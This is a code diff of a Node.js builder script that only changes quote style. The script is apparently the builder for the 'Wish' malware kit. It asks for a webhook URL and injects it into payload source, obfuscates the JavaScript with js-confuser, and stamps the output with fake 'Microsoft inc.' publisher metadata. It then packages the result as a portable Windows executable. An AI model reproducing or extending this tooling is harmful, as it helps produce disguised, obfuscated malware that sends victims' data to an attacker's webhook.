@@ -1,15 +1,15 @@
-const child_process = require("child_process");
-const electron = require("electron-builder");
-const gradient = require("gradient-string");
-const imageToIco = require("image-to-ico");
-const jsConfuser = require("js-confuser");
-const chalk = require("chalk-animation");
-const readline = require("readline");
-const axios = require("axios");
-const path = require("path");
-const fs = require("fs");
+const child_process = require('child_process');
+const electron = require('electron-builder');
+const gradient = require('gradient-string');
+const imageToIco = require('image-to-ico');
+const jsConfuser = require('js-confuser');
+const chalk = require('chalk-animation');
+const readline = require('readline');
+const axios = require('axios');
+const path = require('path');
+const fs = require('fs');
 
-const utils = require("./utils.js");
+const utils = require('./utils.js');
 
 const rl = readline.createInterface({
  input: process.stdin,
@@ -26,13 +26,13 @@ class Builder {
 
  async CreateIcon(imageUrl, imagePathTemp, imagePath) {
   try {
-   const response = await axios.get(imageUrl, { responseType: "stream" });
+   const response = await axios.get(imageUrl, { responseType: 'stream' });
    const writer = fs.createWriteStream(imagePathTemp);
    response.data.pipe(writer);
 
    await new Promise((resolve, reject) => {
-    writer.on("finish", resolve);
-    writer.on("error", reject);
+    writer.on('finish', resolve);
+    writer.on('error', reject);
    });
 
    const buffer = await imageToIco(imagePathTemp, {
@@ -50,27 +50,27 @@ class Builder {
 
  rebuild(dirPath) {
   try {
-   child_process.execSync("pnpm rebuild", {
+   child_process.execSync('pnpm rebuild', {
     cwd: dirPath,
-    stdio: "inherit",
+    stdio: 'inherit',
     timeout: 60 * 1000,
    });
-   console.log("Rebuild successfully completed");
+   console.log('Rebuild successfully completed');
    return true;
   } catch (error) {
-   console.error("Error during rebuild:", error.message);
+   console.error('Error during rebuild:', error.message);
    return false;
   }
  }
 
  async CreateBuild(dirPath) {
-  const exeName = this.jsonConfig.EXECUTABLE_NAME || "Aurita";
+  const exeName = this.jsonConfig.EXECUTABLE_NAME || 'Aurita';
   const imageUrl = this.jsonConfig.EXECUTABLE_IMG;
-  const buildPath = path.join(process.cwd(), "build");
-  const exeDist = path.join(buildPath, "dist", exeName);
-  const resultsPath = path.join(buildPath, "results");
-  const imagePathTemp = path.join(buildPath, "icons", `${exeName}.png`);
-  const iconPath = path.join(buildPath, "icons", `${exeName}.ico`);
+  const buildPath = path.join(process.cwd(), 'build');
+  const exeDist = path.join(buildPath, 'dist', exeName);
+  const resultsPath = path.join(buildPath, 'results');
+  const imagePathTemp = path.join(buildPath, 'icons', `${exeName}.png`);
+  const iconPath = path.join(buildPath, 'icons', `${exeName}.ico`);
 
   try {
    await this.CreateIcon(imageUrl, imagePathTemp, iconPath);
@@ -80,16 +80,16 @@ class Builder {
    await electron.build({
     targets: electron.Platform.WINDOWS.createTarget(null, electron.Arch.x64),
     config: {
-     compression: "normal",
-     buildVersion: "1.0.0",
-     electronVersion: "17.1.0",
+     compression: 'normal',
+     buildVersion: '1.0.0',
+     electronVersion: '17.1.0',
      nodeGypRebuild: false,
      npmRebuild: false,
-     appId: "win32",
+     appId: 'win32',
      productName: exeName,
      win: {
       artifactName: `${exeName}.exe`,
-      target: "portable",
+      target: 'portable',
       icon: iconPath,
      },
      directories: {
@@ -99,7 +99,7 @@ class Builder {
     },
    });
 
-   const filesToRemove = [path.join(exeDist, "builder-debug.yml"), path.join(exeDist, "builder-effective-config.yaml"), path.join(exeDist, `win-unpacked`)];
+   const filesToRemove = [path.join(exeDist, 'builder-debug.yml'), path.join(exeDist, 'builder-effective-config.yaml'), path.join(exeDist, `win-unpacked`)];
 
    for (const file of filesToRemove) {
     if (fs.existsSync(file)) {
@@ -120,14 +120,14 @@ class Builder {
    if (fs.existsSync(exeDist)) fs.rmSync(exeDist, { recursive: true });
    if (fs.existsSync(iconPath)) fs.unlinkSync(iconPath);
    if (fs.existsSync(dirPath)) fs.rmSync(dirPath, { recursive: true });
-   console.error("Error during build process:", error);
+   console.error('Error during build process:', error);
   }
  }
 
  async CreateObf() {
-  const { WEBHOOK_URL: webhookUrl, EXECUTABLE_NAME: exeName = "Wish", VERSION: productVersion = "1.0.0", DESCRIPTION: appFileDescription = "Do Do-Hee <3", APP_COMPANY: appCompanyName = "Microsoft inc.", APP_LEGAL_COPYRIGHT: appLegalCopyright = "Microsoft Copyright inc.", AUTHOR: author = "k4itrun", LICENSE: license = "MIT" } = this.jsonConfig;
+  const { WEBHOOK_URL: webhookUrl, EXECUTABLE_NAME: exeName = 'Wish', VERSION: productVersion = '1.0.0', DESCRIPTION: appFileDescription = 'Do Do-Hee <3', APP_COMPANY: appCompanyName = 'Microsoft inc.', APP_LEGAL_COPYRIGHT: appLegalCopyright = 'Microsoft Copyright inc.', AUTHOR: author = 'k4itrun', LICENSE: license = 'MIT' } = this.jsonConfig;
 
-  const outputDir = path.join(process.cwd(), "build", "script", exeName);
+  const outputDir = path.join(process.cwd(), 'build', 'script', exeName);
 
   const CloneDir = (dirPath, destPath) => {
    try {
@@ -138,7 +138,7 @@ class Builder {
     const files = fs.readdirSync(dirPath);
 
     files.forEach((file) => {
-     if (file === "node_modules") return;
+     if (file === 'node_modules') return;
 
      const srcFilePath = path.join(dirPath, file);
      const destFilePath = path.join(destPath, file);
@@ -168,8 +168,8 @@ class Builder {
 
      if (fs.statSync(filePath).isDirectory()) {
       await ObfuscateFiles(filePath);
-     } else if (file.endsWith(".js") && !filePath.includes("dev") && !filePath.includes("node_modules")) {
-      const srcCode = fs.readFileSync(filePath, "utf-8");
+     } else if (file.endsWith('.js') && !filePath.includes('dev') && !filePath.includes('node_modules')) {
+      const srcCode = fs.readFileSync(filePath, 'utf-8');
 
       const applyObfCode = await jsConfuser.obfuscate(srcCode, this.options.confuserOptions);
 
@@ -188,7 +188,7 @@ class Builder {
   const ReplaceKeys = (file) => {
    try {
     const content = fs
-     .readFileSync(file, "utf-8")
+     .readFileSync(file, 'utf-8')
      .replace(/%WEBHOOK_URL%/g, webhookUrl)
      .replace(/%APPNAME%/g, exeName);
 
@@ -201,7 +201,7 @@ class Builder {
   const ReplaceInfos = (file) => {
    try {
     const content = fs
-     .readFileSync(file, "utf-8")
+     .readFileSync(file, 'utf-8')
      .replace(/%VERSION%/g, productVersion)
      .replace(/%DESCRIPTION%/g, appFileDescription)
      .replace(/%PRODUCTVERSION%/g, productVersion)
@@ -227,9 +227,9 @@ class Builder {
 
      if (isDirectory) {
       Traverse(filePath);
-     } else if (file.endsWith(".js") && !filePath.includes("node_modules")) {
+     } else if (file.endsWith('.js') && !filePath.includes('node_modules')) {
       ReplaceKeys(filePath);
-     } else if (file.endsWith(".json") && !filePath.includes("node_modules")) {
+     } else if (file.endsWith('.json') && !filePath.includes('node_modules')) {
       ReplaceInfos(filePath);
      }
     });
@@ -253,36 +253,36 @@ class Builder {
    this.currentQst++;
 
    const answer = await new Promise((resolve) => {
-    const questionText = utils.applyGradient(["#fcca7e", "#ed7efc", "#7eb0fc", "#7ee0fc"], `Question ${this.currentQst}: ${qst}`);
+    const questionText = utils.applyGradient(['#fcca7e', '#ed7efc', '#7eb0fc', '#7ee0fc'], `Question ${this.currentQst}: ${qst}`);
     rl.question(questionText, (ans) => {
      resolve(ans.trim());
     });
    });
    return answer;
   } catch (error) {
-   console.error("Error while creating question:", error);
-   return "";
+   console.error('Error while creating question:', error);
+   return '';
   }
  }
 
  async installDependencies(srcDir) {
   return new Promise((resolve, reject) => {
-   const child = child_process.spawn("pnpm", ["install"], {
+   const child = child_process.spawn('pnpm', ['install'], {
     cwd: srcDir,
-    stdio: "inherit",
+    stdio: 'inherit',
     shell: true,
    });
 
-   child.on("close", (code) => {
+   child.on('close', (code) => {
     if (code === 0) {
-     console.log("Dependencies installed successfully");
+     console.log('Dependencies installed successfully');
      resolve();
     } else {
      reject(new Error(`Failed with exit code ${code}`));
     }
    });
 
-   child.on("error", (err) => {
+   child.on('error', (err) => {
     reject(new Error(`Failed to start pnpm install: ${err.message}`));
    });
   });
@@ -297,7 +297,7 @@ class Builder {
     chalk.radar(gradient.summer(utils.WishBanner())).stop();
 
     console.clear();
-    console.log(utils.applyGradient(["#FFFFFF", "#E0BBE4", "#957DAD", "#D291BC", "#F17EF7", "#8A2BE2", "#af45fa"], utils.WishBanner()));
+    console.log(utils.applyGradient(['#FFFFFF', '#E0BBE4', '#957DAD', '#D291BC', '#F17EF7', '#8A2BE2', '#af45fa'], utils.WishBanner()));
 
     let webhookUrl = await this.createAsk('Add your "WEBHOOK_URL": ');
     while (!utils.isWebhookUrl(webhookUrl)) {
@@ -311,26 +311,26 @@ class Builder {
 
     this.jsonConfig.WEBHOOK_URL = webhookUrl;
     this.jsonConfig.EXECUTABLE_IMG = ImageUrl;
-    this.jsonConfig.EXECUTABLE_NAME = await this.createAsk("Please specify your 'EXE' file \"Name\": ");
-    this.jsonConfig.DESCRIPTION = await this.createAsk("Please specify your 'EXE' file \"Description\": ");
-    this.jsonConfig.APP_COMPANY = await this.createAsk("Please specify your 'EXE' file \"App Company\": ");
-    this.jsonConfig.APP_LEGAL_COPYRIGHT = await this.createAsk("Please specify your 'EXE' file \"Legal Copyright\": ");
-    this.jsonConfig.AUTHOR = await this.createAsk("Please specify your 'EXE' file \"Author\": ");
-    this.jsonConfig.LICENSE = await this.createAsk("Please specify your 'EXE' file \"License\": ");
+    this.jsonConfig.EXECUTABLE_NAME = await this.createAsk('Please specify your \'EXE\' file "Name": ');
+    this.jsonConfig.DESCRIPTION = await this.createAsk('Please specify your \'EXE\' file "Description": ');
+    this.jsonConfig.APP_COMPANY = await this.createAsk('Please specify your \'EXE\' file "App Company": ');
+    this.jsonConfig.APP_LEGAL_COPYRIGHT = await this.createAsk('Please specify your \'EXE\' file "Legal Copyright": ');
+    this.jsonConfig.AUTHOR = await this.createAsk('Please specify your \'EXE\' file "Author": ');
+    this.jsonConfig.LICENSE = await this.createAsk('Please specify your \'EXE\' file "License": ');
 
     rl.close();
     console.clear();
 
-    console.log("Obfuscation...");
+    console.log('Obfuscation...');
     const outputDir = await this.CreateObf();
 
-    console.log("install Dependencies...");
+    console.log('install Dependencies...');
     await this.installDependencies(outputDir);
 
-    console.log("Building...");
+    console.log('Building...');
     await this.CreateBuild(outputDir);
 
-    console.log("Filled...");
+    console.log('Filled...');
    }, 5000);
   } catch (error) {
    console.error(error);
